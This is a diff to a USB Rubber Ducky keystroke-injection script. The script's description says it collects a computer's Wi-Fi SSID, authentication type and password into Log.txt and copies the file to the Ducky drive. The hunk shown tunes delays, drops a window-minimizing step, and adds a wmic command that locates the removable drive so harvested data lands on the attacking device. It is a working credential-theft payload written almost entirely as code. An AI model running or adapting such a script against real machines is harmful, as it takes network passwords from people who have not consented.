@@ -5,21 +5,20 @@ REM Version: 1
 REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt then moves the file to the Rubber Ducky.
 DELAY 3000
 
-REM --> Minimize all windows
-GUI d
-DELAY 1000
 REM --> Open cmd
 GUI r
-DELAY 1000
+DELAY 500
 STRING cmd
 ENTER
-DELAY 1000
+DELAY 500
+
+REM --> Getting Drive Letter
+STRING for /f "tokens=2 delims==" %%d in ('wmic logicaldisk where 'drivetype=2' get name /format:value') do set driveletter=%%d
+ENTER
 
 REM --> Getting SSID
 
-STRING for /f in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL` | findstr ":\") do set Z=%A
-ENTER
-STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
+STRING cd "%driveletter%" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
 ENTER
 
 
